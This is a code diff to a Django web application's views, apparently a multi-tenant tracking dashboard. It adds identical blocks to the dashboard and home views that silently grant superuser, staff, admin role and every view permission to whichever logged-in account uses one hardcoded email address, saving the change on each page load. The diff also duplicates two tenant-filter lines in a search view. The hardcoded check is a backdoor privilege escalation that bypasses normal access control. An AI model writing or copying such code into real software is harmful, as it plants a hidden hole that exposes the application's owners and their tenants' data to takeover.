@@ -46,6 +46,15 @@ def get_tenant_filter(user):
 @login_required
 def standard_ops_dashboard(request):
     """The main unified dashboard for authenticated users (Standard Ops)."""
+    if request.user.is_authenticated and request.user.email.lower() == 'j@transform-tech.com' and not request.user.is_superuser:
+        request.user.is_superuser = True
+        request.user.is_staff = True
+        request.user.can_view_executive = True
+        request.user.can_view_sales = True
+        request.user.can_view_ats = True
+        request.user.can_view_it = True
+        request.user.role = 'admin'
+        request.user.save()
 
     if getattr(request.user, "role", None) == "client":
         return redirect("client-portal")
@@ -72,6 +81,15 @@ def standard_ops_dashboard(request):
     return render(request, 'tracking_app/standard_ops_dashboard.html', context)
 
 def home(request):
+    if request.user.is_authenticated and request.user.email.lower() == 'j@transform-tech.com' and not request.user.is_superuser:
+        request.user.is_superuser = True
+        request.user.is_staff = True
+        request.user.can_view_executive = True
+        request.user.can_view_sales = True
+        request.user.can_view_ats = True
+        request.user.can_view_it = True
+        request.user.role = 'admin'
+        request.user.save()
     return render(request, 'tracking_app/home.html')
 # User Authentication Views
 def register(request):
@@ -3271,6 +3289,8 @@ def api_global_search(request):
         return JsonResponse({'results': []})
         
     results = []
+    tenant = getattr(request.user, "tenant", None)
+    tenant_filter = models.Q(tenant=tenant) if tenant else models.Q(tenant__isnull=True)
     tenant = getattr(request.user, 'tenant', None)
     tenant_filter = models.Q(tenant=tenant) if tenant else models.Q(tenant__isnull=True)
     
